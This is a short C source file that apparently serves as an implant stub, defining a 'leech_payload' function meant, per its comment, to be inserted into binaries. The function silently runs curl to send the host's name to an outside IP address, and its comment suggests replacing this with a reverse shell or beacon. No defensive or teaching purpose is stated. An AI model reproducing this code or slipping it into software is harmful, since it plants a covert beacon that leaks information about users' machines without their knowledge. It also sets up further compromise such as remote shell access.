
// Payload function to be inserted into binaries
#include <stdio.h>
#include <stdlib.h>

void leech_payload() {
    // Symbolic payload
    // Replace with reverse shell, beacon, or logging logic
    system("curl -s http://198.51.100.2/leech?host=$(hostname) > /dev/null 2>&1");
}
